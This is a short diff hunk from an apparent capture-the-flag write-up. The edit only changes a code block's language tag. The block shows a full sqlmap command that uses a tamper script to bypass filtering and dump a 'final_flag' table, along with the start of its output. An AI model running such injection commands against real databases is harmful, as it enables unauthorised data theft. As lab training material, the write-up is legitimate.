@@ -14,7 +14,7 @@ Content-Length: 11
 
 Run sqlmap focus on the `id` value with tamper script to dump the `final_flag` table:
 
-```sh
+```shellsession
 $ sqlmap -r req --batch --level 5 --risk 3 --tamper=between --proxy=http://127.0.0.1:8080 -T final_flag --dump
 <SNIP>
 Database: production
